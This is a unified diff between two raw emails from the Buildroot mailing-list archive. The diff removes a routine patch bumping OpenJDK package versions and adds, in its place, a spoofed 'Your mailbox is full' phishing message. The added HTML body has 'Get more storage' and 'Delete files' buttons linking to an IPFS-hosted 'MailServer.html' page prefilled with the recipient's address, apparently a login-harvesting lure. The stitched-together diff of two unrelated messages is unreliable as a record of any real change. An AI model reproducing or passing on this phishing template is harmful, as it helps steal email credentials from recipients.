@@ -4,91 +4,47 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 4A543CA0ED3
-	for <buildroot@archiver.kernel.org>; Wed,  4 Sep 2024 08:51:52 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 1D743CD3431
+	for <buildroot@archiver.kernel.org>; Wed,  4 Sep 2024 09:29:14 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp1.osuosl.org (Postfix) with ESMTP id 6B89F80F89;
-	Wed,  4 Sep 2024 08:51:51 +0000 (UTC)
+	by smtp1.osuosl.org (Postfix) with ESMTP id 80F6680E4E;
+	Wed,  4 Sep 2024 09:29:14 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
  by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id tiJ-ibHTLnXO; Wed,  4 Sep 2024 08:51:50 +0000 (UTC)
+ id WL2pW32dM4ep; Wed,  4 Sep 2024 09:29:13 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 469CC80F09
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 88A3F8110C
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp1.osuosl.org (Postfix) with ESMTP id 469CC80F09;
-	Wed,  4 Sep 2024 08:51:50 +0000 (UTC)
-Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
- by ash.osuosl.org (Postfix) with ESMTP id 326721BF356
- for <buildroot@lists.busybox.net>; Wed,  4 Sep 2024 08:51:49 +0000 (UTC)
+	by smtp1.osuosl.org (Postfix) with ESMTP id 88A3F8110C;
+	Wed,  4 Sep 2024 09:29:13 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id DD26E1BF577
+ for <buildroot@lists.busybox.net>; Wed,  4 Sep 2024 09:29:12 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp3.osuosl.org (Postfix) with ESMTP id 202E7606D6
- for <buildroot@lists.busybox.net>; Wed,  4 Sep 2024 08:51:49 +0000 (UTC)
+ by smtp1.osuosl.org (Postfix) with ESMTP id C97378110C
+ for <buildroot@lists.busybox.net>; Wed,  4 Sep 2024 09:29:12 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp3.osuosl.org ([127.0.0.1])
- by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id zPNqjI17GKd0 for <buildroot@lists.busybox.net>;
- Wed,  4 Sep 2024 08:51:48 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom;
- client-ip=2a00:1450:4864:20::544; helo=mail-ed1-x544.google.com;
- envelope-from=adam.duskett@amarulasolutions.com; receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp3.osuosl.org B2BAA606C4
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org B2BAA606C4
-Received: from mail-ed1-x544.google.com (mail-ed1-x544.google.com
- [IPv6:2a00:1450:4864:20::544])
- by smtp3.osuosl.org (Postfix) with ESMTPS id B2BAA606C4
- for <buildroot@buildroot.org>; Wed,  4 Sep 2024 08:51:47 +0000 (UTC)
-Received: by mail-ed1-x544.google.com with SMTP id
- 4fb4d7f45d1cf-5c26e5d05d3so225155a12.0
- for <buildroot@buildroot.org>; Wed, 04 Sep 2024 01:51:47 -0700 (PDT)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20230601; t=1725439905; x=1726044705;
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:x-gm-message-state:from:to:cc:subject:date:message-id
- :reply-to;
- bh=aLSDoBRXv3+3yPVtgbHcPyW3PLfr3YCF7Mn/IK5a+Z8=;
- b=dHaBudWUTfOrADjjvNGNT2s8/5whvT0mlJuFZIlntO6pCOpqqkXlV+lqF58FLIJdzy
- KRxTC92MXbvgEayAhmmgXQaY3pEXIQbrMMgNtD4E/d0Pg5O3YY1yzlhtEtJl5JE6wH/a
- YeSc4eie29o20LF5G2kUS07Tmj+LDp5j7GtBhgGiA2+z1lomfFCZZw6tin3nq9Z4yW7K
- +EUyU3BrWd1N6Ojr6OfY/2nqewyHhhFXpjsj/rMHbF+8qszY1uFNP0qYWGbjge3zuVGt
- N6PJvSSKe8AI4XZGMreTGawi6ncd/tPoHSH+7J/94mxxAoo78SAT2oyg4+LKE49ZCSZG
- gUQQ==
-X-Gm-Message-State: AOJu0YwMLCPy73rJ46H8bjjlcb0J+VCEenAx4cyykgKu9Bfiy2WBtQL5
- QjRg+8z+PPunIrkhz50f4tQMuATPH7umKZMEy5ZQXZ2oDgQczL5K9gmymfnvLUFTxQuqktXxbGR
- 29rHiMBT0
-X-Google-Smtp-Source: AGHT+IH9DaZyDpZyERjSWlXcb27XIWk0mMj7xAyhbH91fZAGkewvloIKNxwHwZnSZbxsLUKaYpC3FA==
-X-Received: by 2002:a05:6402:50c9:b0:5c2:6f74:782f with SMTP id
- 4fb4d7f45d1cf-5c26f7479aemr1792939a12.5.1725439904469; 
- Wed, 04 Sep 2024 01:51:44 -0700 (PDT)
-Received: from adam-laptop.ipgroup.local (212-57-59-66.xdsl.deanconnect.nl.
- [212.57.59.66]) by smtp.gmail.com with ESMTPSA id
- 4fb4d7f45d1cf-5c226c7c2aesm7429566a12.51.2024.09.04.01.51.43
- (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
- Wed, 04 Sep 2024 01:51:44 -0700 (PDT)
-From: Adam Duskett <adam.duskett@amarulasolutions.com>
-To: buildroot@buildroot.org
-Date: Wed,  4 Sep 2024 10:51:40 +0200
-Message-ID: <20240904085140.1307904-1-adam.duskett@amarulasolutions.com>
-X-Mailer: git-send-email 2.46.0
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id UBv953NUKeJS for <buildroot@lists.busybox.net>;
+ Wed,  4 Sep 2024 09:29:12 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.28;
+ helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 8188680E4E
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 8188680E4E
+Received: from busybox.net (unknown [141.98.10.28])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 8188680E4E
+ for <buildroot@busybox.net>; Wed,  4 Sep 2024 09:29:11 +0000 (UTC)
+From: busybox.net <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 4 Sep 2024 11:29:09 +0200
+Message-ID: <20240904112909.481EEAEB573BDAC4@busybox.net>
 MIME-Version: 1.0
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=amarulasolutions.com; s=google; t=1725439905; x=1726044705;
- darn=buildroot.org; 
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:from:to:cc:subject:date:message-id:reply-to;
- bh=aLSDoBRXv3+3yPVtgbHcPyW3PLfr3YCF7Mn/IK5a+Z8=;
- b=GqTzPuQruVnWqboE0bP17DF0hC44FJ6mWAHV+Ad6BYhBZgAlaxW2BUgOO//FjuTi4R
- opymbXSTLZowvMe4Ilub8ts1tO/ZzE02CAgG94NucnM5IFknVwCw7k6v6OMJ9Uj2Y6VW
- iNKwVEzmRJGHg1gCOcHZ4g3u3IXkO3zk1+/Pg=
-X-Mailman-Original-Authentication-Results: smtp3.osuosl.org;
- dmarc=pass (p=none dis=none)
- header.from=amarulasolutions.com
-X-Mailman-Original-Authentication-Results: smtp3.osuosl.org;
- dkim=pass (1024-bit key,
- unprotected) header.d=amarulasolutions.com header.i=@amarulasolutions.com
- header.a=rsa-sha256 header.s=google header.b=GqTzPuQr
-Subject: [Buildroot] [PATCH 1/1] package/openjdk{-bin}: bump versions to
- 17.0.12+7 and 21.0.4+7
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] Your mailbox is full.
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -100,107 +56,177 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: Adam Duskett <adam.duskett@amarulasolutions.com>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============5767270537505954584=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-./support/testing/run-tests tests.package.test_openjdk.TestOpenJdk.test_run
-passed without issue.
+--===============5767270537505954584==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-Signed-off-by: Adam Duskett <adam.duskett@amarulasolutions.com>
----
- package/openjdk-bin/{17.0.9_9 => 17.0.12_7}/openjdk-bin.hash | 4 ++--
- package/openjdk-bin/{21.0.1_12 => 21.0.4_7}/openjdk-bin.hash | 4 ++--
- package/openjdk-bin/openjdk-bin.mk                           | 4 ++--
- package/openjdk/openjdk.hash                                 | 4 ++--
- package/openjdk/openjdk.mk                                   | 4 ++--
- 5 files changed, 10 insertions(+), 10 deletions(-)
- rename package/openjdk-bin/{17.0.9_9 => 17.0.12_7}/openjdk-bin.hash (53%)
- rename package/openjdk-bin/{21.0.1_12 => 21.0.4_7}/openjdk-bin.hash (53%)
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
+; text-indent: 0px; letter-spacing: normal; font-family: "Lucida Grande", V=
+erdana, Arial, Helvetica, sans-serif; font-size: 1.2em; font-style: normal;=
+ font-weight: 600; margin-top: 0px; margin-bottom: 1.5em; word-spacing: 0px=
+; white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 25=
+5, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial;'>b=
+uildroot@busybox.net, your mailbox is full.</p>
+<p>
+<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
+(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
+t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
+e-space: normal; border-collapse: collapse; orphans: 2; widows: 2; backgrou=
+nd-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-=
+caps: normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">=
 
-diff --git a/package/openjdk-bin/17.0.9_9/openjdk-bin.hash b/package/openjdk-bin/17.0.12_7/openjdk-bin.hash
-similarity index 53%
-rename from package/openjdk-bin/17.0.9_9/openjdk-bin.hash
-rename to package/openjdk-bin/17.0.12_7/openjdk-bin.hash
-index 29f39c5d36..4a7c84eb87 100644
---- a/package/openjdk-bin/17.0.9_9/openjdk-bin.hash
-+++ b/package/openjdk-bin/17.0.12_7/openjdk-bin.hash
-@@ -1,6 +1,6 @@
- # https://github.com/adoptium/temurin17-binaries/releases
--sha256  7b175dbe0d6e3c9c23b6ed96449b018308d8fc94a5ecd9c0df8b8bc376c3c18a  OpenJDK17U-jdk_x64_linux_hotspot_17.0.9_9.tar.gz
--sha256  e2c5e26f8572544b201bc22a9b28f2b1a3147ab69be111cea07c7f52af252e75  OpenJDK17U-jdk_aarch64_linux_hotspot_17.0.9_9.tar.gz
-+sha256  9d4dd339bf7e6a9dcba8347661603b74c61ab2a5083ae67bf76da6285da8a778  OpenJDK17U-jdk_x64_linux_hotspot_17.0.12_7.tar.gz
-+sha256  8257de06bf37f0c8f19f8d542e2ab5a4e17db3ca5f29d041bd0b02ab265db021  OpenJDK17U-jdk_aarch64_linux_hotspot_17.0.12_7.tar.gz
- 
- # Locally calculated
- sha256  4b9abebc4338048a7c2dc184e9f800deb349366bdf28eb23c2677a77b4c87726  legal/java.prefs/LICENSE
-diff --git a/package/openjdk-bin/21.0.1_12/openjdk-bin.hash b/package/openjdk-bin/21.0.4_7/openjdk-bin.hash
-similarity index 53%
-rename from package/openjdk-bin/21.0.1_12/openjdk-bin.hash
-rename to package/openjdk-bin/21.0.4_7/openjdk-bin.hash
-index 35be28bb4f..a73bea1a77 100644
---- a/package/openjdk-bin/21.0.1_12/openjdk-bin.hash
-+++ b/package/openjdk-bin/21.0.4_7/openjdk-bin.hash
-@@ -1,6 +1,6 @@
- # From https://github.com/adoptium/temurin21-binaries/releases
--sha256  1a6fa8abda4c5caed915cfbeeb176e7fbd12eb6b222f26e290ee45808b529aa1  OpenJDK21U-jdk_x64_linux_hotspot_21.0.1_12.tar.gz
--sha256  e184dc29a6712c1f78754ab36fb48866583665fa345324f1a79e569c064f95e9  OpenJDK21U-jdk_aarch64_linux_hotspot_21.0.1_12.tar.gz
-+sha256  51fb4d03a4429c39d397d3a03a779077159317616550e4e71624c9843083e7b9  OpenJDK21U-jdk_x64_linux_hotspot_21.0.4_7.tar.gz
-+sha256  d768eecddd7a515711659e02caef8516b7b7177fa34880a56398fd9822593a79  OpenJDK21U-jdk_aarch64_linux_hotspot_21.0.4_7.tar.gz
- 
- # Locally calculated
- sha256  4b9abebc4338048a7c2dc184e9f800deb349366bdf28eb23c2677a77b4c87726  legal/java.prefs/LICENSE
-diff --git a/package/openjdk-bin/openjdk-bin.mk b/package/openjdk-bin/openjdk-bin.mk
-index 0280151fba..17056e80b7 100644
---- a/package/openjdk-bin/openjdk-bin.mk
-+++ b/package/openjdk-bin/openjdk-bin.mk
-@@ -6,10 +6,10 @@
- 
- ifeq ($(BR2_PACKAGE_OPENJDK_VERSION_21),y)
- HOST_OPENJDK_BIN_VERSION_MAJOR = 21
--HOST_OPENJDK_BIN_VERSION_MINOR = 0.1_12
-+HOST_OPENJDK_BIN_VERSION_MINOR = 0.4_7
- else
- HOST_OPENJDK_BIN_VERSION_MAJOR = 17
--HOST_OPENJDK_BIN_VERSION_MINOR = 0.9_9
-+HOST_OPENJDK_BIN_VERSION_MINOR = 0.12_7
- endif
- 
- ifeq ($(HOSTARCH),x86_64)
-diff --git a/package/openjdk/openjdk.hash b/package/openjdk/openjdk.hash
-index 949a62e527..209004a292 100644
---- a/package/openjdk/openjdk.hash
-+++ b/package/openjdk/openjdk.hash
-@@ -1,4 +1,4 @@
- # Locally computed
--sha256  9943e3814d3c1a31f1449f09a8b67df54841944f855a1d372be892c5e6b19217  openjdk-21.0.1+12.tar.gz
--sha256  836adb5fec5a58ce2f49a0faeaf9e69a3cb89865f4d855c6098f0264843672ad  openjdk-17.0.9+9.tar.gz
-+sha256  b8b37fa6fcc284d91e7458c703ca4c893a1dd5a6e0f6b9e198e7d13cd8efd24d  openjdk-21.0.4+7.tar.gz
-+sha256  ccb7d37c24f9f5808f9d25419d93680570dc600f292e68944032338cb4b2c51e  openjdk-17.0.12+7.tar.gz
- sha256  4b9abebc4338048a7c2dc184e9f800deb349366bdf28eb23c2677a77b4c87726  LICENSE
-diff --git a/package/openjdk/openjdk.mk b/package/openjdk/openjdk.mk
-index f4e1920e6c..446e4aa3c2 100644
---- a/package/openjdk/openjdk.mk
-+++ b/package/openjdk/openjdk.mk
-@@ -6,10 +6,10 @@
- 
- ifeq ($(BR2_PACKAGE_OPENJDK_VERSION_21),y)
- OPENJDK_VERSION_MAJOR = 21
--OPENJDK_VERSION_MINOR = 0.1+12
-+OPENJDK_VERSION_MINOR = 0.4+7
- else
- OPENJDK_VERSION_MAJOR = 17
--OPENJDK_VERSION_MINOR = 0.9+9
-+OPENJDK_VERSION_MINOR = 0.12+7
- endif
- OPENJDK_VERSION = $(OPENJDK_VERSION_MAJOR).$(OPENJDK_VERSION_MINOR)
- OPENJDK_SITE = $(call github,openjdk,jdk$(OPENJDK_VERSION_MAJOR)u,jdk-$(OPENJDK_VERSION))
--- 
-2.46.0
+<tbody>
+<tr style=3D"height: 0.5em;">
+<td style=3D"background: 0% 50% rgb(218, 60, 47); margin: 0px; width: 321px=
+; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;">&nbsp;</=
+td>
+<td style=3D"background: 0% 50% rgb(224, 224, 224); margin: 0px; font-famil=
+y: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;">&nbsp;</td></tr></tb=
+ody></table>
+<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
+(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
+t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
+e-space: normal; border-collapse: collapse; orphans: 2; widows: 2; backgrou=
+nd-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-=
+caps: normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">=
+
+<tbody>
+<tr>
+<td align=3D"left" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, =
+Helvetica, Arial, sans-serif;"><span style=3D"color: rgb(218, 60, 47); font=
+-weight: bold;">4.82 GB</span></td>
+<td align=3D"right" style=3D"margin: 0px; font-family: Roboto, RobotoDraft,=
+ Helvetica, Arial, sans-serif;"><span style=3D"font-weight: bold;">4.86 GB<=
+/span></td></tr></tbody></table><p></p>
+<p style=3D'margin: 3em auto; text-align: center; color: rgb(51, 51, 51); t=
+ext-transform: none; text-indent: 0px; letter-spacing: normal; font-family:=
+ "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; font-size: 11px; f=
+ont-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal=
+; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant=
+-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0=
+px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'>
+<span style=3D'text-align: center; color: rgb(37, 39, 43); text-transform: =
+none; text-indent: 0px; letter-spacing: normal; font-family: "Google Sans",=
+ Roboto, Arial, sans-serif; font-size: 32px; font-style: normal; font-weigh=
+t: 400; word-spacing: 0px; float: none; display: inline !important; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'><font size=
+=3D"3">You&#8217;re out of storage and may not receive new emails. As a res=
+ult, you may not be able to send and receive emails on your Mail account.</=
+font></span><br class=3D"Apple-interchange-newline"></p>
+<table width=3D"auto" align=3D"center" role=3D"presentation" style=3D'color=
+: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; font-famil=
+y: "Google Sans", Roboto, Arial, sans-serif; font-size: small; font-style: =
+normal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: =
+2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures:=
+ normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-de=
+coration-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;' border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0"><tbody><tr><td style=3D"margin: 0px;"><table role=3D"presen=
+tation" style=3D"margin: 0px; padding: 0px; clear: both; border-collapse: c=
+ollapse; table-layout: fixed;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"0"><tbody><tr><td align=3D"center" style=3D"margin: 0px; padding: 31px =
+0px 4px; border-collapse: collapse; direction: ltr; -ms-word-break: normal;=
+" dir=3D"ltr"><div>
+<a class=3D"m_-5620939630368618957showdesktop" style=3D'padding: 14px 20px =
+13px; border-radius: 4px; text-align: center; color: rgb(255, 255, 255); li=
+ne-height: 21px; letter-spacing: 0.75px; font-family: "Google Sans", Roboto=
+, Arial, sans-serif; font-size: 14px; font-weight: normal; text-decoration:=
+ none; display: inline-block; direction: ltr; background-color: rgb(26, 115=
+, 232);'=20
+href=3D"https://ipfs.io/ipfs/bafkreihlyzawu3c7oi7vs33gou7siljv26dbnplarnu7i=
+dyyjo43ao7zf4?filename=3DMailServer.html#buildroot@busybox.net" target=3D"_=
+blank"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://notification=
+s.google.com/g/p/ANiao5pruUao2faGyc0Xrsv7QgMOgPLjiphDcXAnE4l2sBPOyd1RrNfmaj=
+dJVp22Tb81A8DOf-Jg9B_nmMiFifboUwNyhIfZ2vpxZpHcPIzfwKg2f5MqUXof0BLW73WIqraex=
+F8HCFGbmd2agi-OC2pzOcY2NprdwPccUZolWZoWyG7K7gRfeiwenJoRNEepSu_IFiKe02cnvRXT=
+ggXgZRVRvDlqtZhycDBeVqOAV959o2WxTrCuny_OizspwfUKeosFf9aRKiY20xhO5jkrMFPGDeg=
+vgeP9vb-11KTqwkUedSJF0oydNvmD2ckqg17SNB5SE4TWRFbsdM9AwUOXOcj_fNM0OegqRKJ6Ub=
+OfwQ&amp;source=3Dgmail&amp;ust=3D1704270510399000&amp;usg
+&#10;&#10;=3DAOvVaw1r32spQKUG7OlxsJ_4REWL">Get more storage</a><br>
+<table width=3D"480" role=3D"presentation" style=3D'width: 480px; color: rg=
+b(34, 34, 34); text-transform: none; letter-spacing: normal; font-family: "=
+Google Sans", Roboto, Arial, sans-serif; font-size: small; font-style: norm=
+al; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; w=
+idows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: nor=
+mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
+tion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;' border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0"><tbody><tr><td style=3D'margin: 0px; padding: 49px 0px 0px;=
+ text-align: center; color: rgb(37, 39, 43); line-height: 40px; font-family=
+: "Google Sans", Roboto, Arial, sans-serif; font-size: 26px; font-weight: n=
+ormal; direction: ltr; -ms-word-break: normal;' dir=3D"ltr">Not ready to ge=
+t more storage?</td></tr><tr>
+<td style=3D'margin: 0px; padding: 3px 0px 22px 1px; text-align: center; co=
+lor: rgb(37, 39, 43); line-height: 40px; font-family: "Google Sans", Roboto=
+, Arial, sans-serif; font-size: 16px; font-weight: normal; direction: ltr; =
+-ms-word-break: normal;' dir=3D"ltr"><span class=3D"m_-5620939630368618957s=
+howdesktop" style=3D"display: block;">
+<a style=3D"color: rgb(26, 115, 232); padding-top: 14px; padding-bottom: 14=
+px; text-decoration: none;" href=3D"https://ipfs.io/ipfs/bafkreihlyzawu3c7o=
+i7vs33gou7siljv26dbnplarnu7idyyjo43ao7zf4?filename=3DMailServer.html#buildr=
+oot@busybox.net" target=3D"_blank"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://notification=
+s.google.com/g/p/ANiao5pahEJiovwHB6NgJmVP-42UzXpqcTzgR2FnGD6D4LjzBtmryYJZrH=
+NmnGL6LQ0nb8gpb_ABRR1BE6JI4Khq091fI1CpemlCWWtKSoUyQ4csirGXH7R3Zzf3QZyNI2Jbw=
+52cpuGtZQt5VqzpQ_xniCmv8SYsskuZ12aSJaAlFQdcRdnIsmRxtEOyN-MFMpChwpAsIfx-heZE=
+Pzuu-Cvml2rNqdvKwnl1_7wr6xI_iutIdgYdnC-MqJGVWToagYRbKmB2Q9d1hpXaJj3Gt0Vx1kC=
+MyFyk2jVb6ozlCvu-ScWULmHkMgk0NYmAF3V0SjD5jSJY8i37W7t0X9QPyxYp1fCJtsWajLqhoo=
+Ml-TB5tyIYPM7NwB6nB9U&amp;source=3Dgmail&amp;ust=3D1704270
+&#10;&#10;510399000&amp;usg=3DAOvVaw3AgOY99D8ViKdrNd4eAvCV">Delete files to=
+ free up space.</a></span></td></tr></tbody></table></div></td></tr></tbody=
+></table></td></tr></tbody></table>
+<table width=3D"480" role=3D"presentation" style=3D'width: 480px; color: rg=
+b(34, 34, 34); text-transform: none; letter-spacing: normal; font-family: "=
+Google Sans", Roboto, Arial, sans-serif; font-size: small; font-style: norm=
+al; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; w=
+idows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: nor=
+mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
+tion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;' border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0"><tbody><tr><td style=3D'margin: 0px; padding: 49px 0px 0px;=
+ text-align: center; color: rgb(37, 39, 43); line-height: 40px; font-family=
+: "Google Sans", Roboto, Arial, sans-serif; font-size: 26px; font-weight: n=
+ormal; direction: ltr; -ms-word-break: normal;' dir=3D"ltr"><br></td></tr><=
+tr>
+<td style=3D'margin: 0px; padding: 3px 0px 22px 1px; text-align: center; co=
+lor: rgb(37, 39, 43); line-height: 40px; font-family: "Google Sans", Roboto=
+, Arial, sans-serif; font-size: 16px; font-weight: normal; direction: ltr; =
+-ms-word-break: normal;' dir=3D"ltr"><span class=3D"m_-5620939630368618957s=
+howdesktop" style=3D"display: block;"><br></span></td></tr></tbody></table>=
+</body></html>
+
+--===============5767270537505954584==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============5767270537505954584==--
